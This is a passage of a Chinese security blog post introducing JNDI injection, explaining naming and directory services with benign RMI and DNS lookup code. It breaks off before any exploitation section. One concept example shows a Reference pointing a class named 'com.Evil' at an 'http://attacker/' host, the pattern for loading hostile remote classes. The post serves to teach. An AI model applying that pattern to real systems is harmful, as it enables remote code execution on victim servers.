<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java JNDI注入总结 | B1ueL0n3's blog</title><meta name="author" content="B1ueL0n3"><meta name="copyright" content="B1ueL0n3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="概念JNDI(Java Naming Directory Interface)，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。 JNDI可访问的现有目录及服务包括：JDBC（Java数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对">
<meta property="og:type" content="article">
<meta property="og:title" content="Java JNDI注入总结">
<meta property="og:url" content="https://b1uel0n3.github.io/archives/be65d471/index.html">
<meta property="og:site_name" content="B1ueL0n3&#39;s blog">
<meta property="og:description" content="概念JNDI(Java Naming Directory Interface)，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。 JNDI可访问的现有目录及服务包括：JDBC（Java数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://b1uel0n3.github.io/img/7.jpg">
<meta property="article:published_time" content="2025-09-27T12:11:11.000Z">
<meta property="article:modified_time" content="2025-09-28T11:11:22.106Z">
<meta property="article:author" content="B1ueL0n3">
<meta property="article:tag" content="JNDI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://b1uel0n3.github.io/img/7.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Java JNDI注入总结",
  "url": "https://b1uel0n3.github.io/archives/be65d471/",
  "image": "https://b1uel0n3.github.io/img/7.jpg",
  "datePublished": "2025-09-27T12:11:11.000Z",
  "dateModified": "2025-09-28T11:11:22.106Z",
  "author": [
    {
      "@type": "Person",
      "name": "B1ueL0n3",
      "url": "https://b1uel0n3.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://b1uel0n3.github.io/archives/be65d471/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Java JNDI注入总结',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/27.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/" title="回到主页"><span class="site-name">B1ueL0n3's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Java JNDI注入总结</span></a><!--鼠标下滑时的文章标题显示--></span><div class="mask-name-container"><center id="name-container"><a id="page-name" href="javascript:btf.scrollToDest(0, 500)"></a></center></div><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Java JNDI注入总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-27T12:11:11.000Z" title="发表于 2025-09-27 20:11:11">2025-09-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-28T11:11:22.106Z" title="更新于 2025-09-28 19:11:22">2025-09-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/java%E5%AE%89%E5%85%A8/">java安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/java%E5%AE%89%E5%85%A8/Java%E5%9F%BA%E7%A1%80/">Java基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">8.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>34分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>JNDI(Java Naming Directory Interface)，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。</p>
<p>JNDI可访问的现有目录及服务包括：JDBC（Java数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对象请求代理系统结构）</p>
<h2 id="命名服务-目录服务"><a href="#命名服务-目录服务" class="headerlink" title="命名服务&#x2F;目录服务"></a>命名服务&#x2F;目录服务</h2><p>JNDI包括命名服务（Naming Service）和目录服务（Directory Service）。</p>
<h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><p>是一种通过名称来查找实际对象的服务。例如在RMI中，Naming.lookup方法通过查找名称来获取远程对象的代理类</p>
<p>相关概念：</p>
<ul>
<li>Name：名称。要么在命名系统中查找对象，需要提供对象的名称，如<code>java:comp/env/jdbc/DataSource</code></li>
<li>Naming Convention：命名规范。一个命名系统中的所有名称必须遵循的语法规范</li>
<li>Binding：绑定。一个名称和一个对象的关联，如<code>bind(&quot;payService&quot;, paymentObj)</code></li>
<li>Reference：引用。一些命名服务系统不是直接存储对象，而是保存对象的引用。引用包含了如何访问实际对象的信息。如<code>&lt;Reference class=&quot;com.Evil&quot; url=&quot;http://attacker/&quot;/&gt;</code></li>
<li>Address：地址。引用通常用一个或多个地址（通信端口）来表示，如<code>ldap://192.168.1.1:389</code></li>
<li>Context：上下文。一个上下文是一系列名称和对象的绑定的集合。一个上下文中的名称可以绑定到一个具有相同命名规范的上下文中，称之为子上下文(subcontext)。例如：在文件系统中，&#x2F;usr是一个Context，&#x2F;usr&#x2F;bin是usr的subcontext</li>
<li>Naming System：命名系统。一个相同类型的上下文集合，例如整个 DNS 系统</li>
<li>Namespace：命名空间。一个命名系统的所有名称的集合，例如DNS的所有域名</li>
<li>Atomic Name：原子名。一个简单基本结构，如文件名 <code>config.txt</code></li>
<li>Compound Name：混合名。由多个原子名一起构成的名称，如文件路径 <code>/home/user/.bashrc</code></li>
<li>Composite Name：复合名称。是跨越多个命名系统的名称，如<code>ldap://ldap.com/cn=user,dc=com+file:/shared.txt</code></li>
</ul>
<h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称为目录对象，目录对象可以跟属性关联，一个目录是由相关联的目录对象组成的系统。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
<p>相关概念：</p>
<ul>
<li>Attribute：属性。一个目录对象可以包含属性。一个属性具有一个属性标识符和一系列属性值</li>
<li>Search Filter：查找过滤器。通常还提供通过目录对象的属性来查找对象的操作，这种的查找一般通过规定的表达式来表示，称之为查找过滤器。</li>
</ul>
<h2 id="JNDI简单利用"><a href="#JNDI简单利用" class="headerlink" title="JNDI简单利用"></a>JNDI简单利用</h2><h3 id="RMI示例"><a href="#RMI示例" class="headerlink" title="RMI示例"></a>RMI示例</h3><h4 id="开启RMI服务"><a href="#开启RMI服务" class="headerlink" title="开启RMI服务"></a>开启RMI服务</h4><p>远程接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>远程对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开启服务：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="comment">//rmi服务地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">5432</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//注册RMI端口</span></span><br><span class="line">        LocateRegistry.createRegistry(PORT);</span><br><span class="line">        <span class="comment">//绑定远程对象</span></span><br><span class="line">        RMIInterface o=<span class="keyword">new</span> <span class="title class_">RMItest</span>();</span><br><span class="line">        Naming.rebind(RMI_NAME,o);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI服务在：&quot;</span>+RMI_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250715165542968.png" alt="image-20250715165542968"></p>
<h4 id="设置JNDI环境参数"><a href="#设置JNDI环境参数" class="headerlink" title="设置JNDI环境参数"></a>设置JNDI环境参数</h4><p>在访问JNDI目录服务时会通过预先设置好环境变量访问对应的服务，这里主要通过Context接口实现的，在Context接口中定义的变量，分别用到了<code>INITIAL_CONTEXT_FACTORY</code>和<code>PROVIDER_URL</code>：</p>
<ul>
<li><p><code>INITIAL_CONTEXT_FACTORY</code>：保存环境属性名称的常量，用于指定要使用的<strong>初始上下文工厂</strong>，即指定 JNDI 服务提供者的入口类。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250715172450950.png" alt="image-20250715172450950"></p>
</li>
<li><p><code>PROVIDER_URL</code>：保存环境属性名称的常量，用于指定服务提供者要使用的配置信息，该属性应包含一个URL字符串</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250715172642689.png" alt="image-20250715172642689"></p>
</li>
</ul>
<p>先设置环境变量：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">env.put(INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">env.put(PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:5432&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里相当于告诉JNDI要连接的是RMI注册表，它在127.0.0.1的5432端口</p>
<h4 id="初始化上下文"><a href="#初始化上下文" class="headerlink" title="初始化上下文"></a>初始化上下文</h4><p>初始化上下文需要用到InitialContext对象来为我们获取命名服务资源，JNDI也提供InitialDirContext对象为我们获取目录服务资源</p>
<p>这里初始化上下文，传入我们设置好的环境变量：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716092306514.png" alt="image-20250716092306514"></p>
<p>传入的是Hashtable对象</p>
<p>如果不指定环境变量的话：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure>

<p>JNDI就会自动搜索系统属性System.getProperty()、applet参数和应用程序资源文件jndi.properties</p>
<p>所以也可以通过System.getProperty()设置环境变量：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">System.getProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:5432&quot;</span>);</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure>

<h4 id="通过上下文查找远程对象"><a href="#通过上下文查找远程对象" class="headerlink" title="通过上下文查找远程对象"></a>通过上下文查找远程对象</h4><p>利用提供的lookup方法，通过查询名字获取远程对象代理类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIInterface</span> <span class="variable">o</span> <span class="operator">=</span> (RMIInterface) ctx.lookup(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="调用远程方法"><a href="#调用远程方法" class="headerlink" title="调用远程方法"></a>调用远程方法</h4><p>最后调用远程方法即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(o.Hello());</span><br></pre></td></tr></table></figure>

<p>完整代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:5432&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        RMIInterface o=(RMIInterface)ctx.lookup(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        System.out.printf(o.Hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716093739555.png" alt="image-20250716093739555"></p>
<h3 id="DNS示例"><a href="#DNS示例" class="headerlink" title="DNS示例"></a>DNS示例</h3><p>与rmi一样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://114.114.114.114&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">        Object o=ctx.lookup(<span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250716095055313.png" alt="image-20250716095055313"></p>
<p>这里我们打算使用DNS服务，从dns:&#x2F;&#x2F;114.114.114.114这个dns服务器上查询<a href="http://www.baidu.com域名对应的IP地址。但这里返回的是一个对象，由于我们用的是JNDI目录服务，而目录服务允许目录对象具有属性，那么我们就能通过目录服务获取ip这个属性值：">www.baidu.com域名对应的IP地址。但这里返回的是一个对象，由于我们用的是JNDI目录服务，而目录服务允许目录对象具有属性，那么我们就能通过目录服务获取ip这个属性值：</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">Attributes o= ctx.getAttributes(<span class="string">&quot;www.baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">System.out.println(o);</span><br></pre></td></tr></table></figure>

<p>DNS记录类型：</p>
<table>
<thead>
<tr>
<th>记录类型</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>A</code></strong></td>
<td>IPv4 地址记录</td>
<td><code>www.baidu.com → 14.215.177.38</code></td>
</tr>
<tr>
<td><code>AAAA</code></td>
<td>IPv6 地址记录</td>
<td><code>www.example.com → 2001:db8::1</code></td>
</tr>
<tr>
<td><code>CNAME</code></td>
<td>别名记录</td>
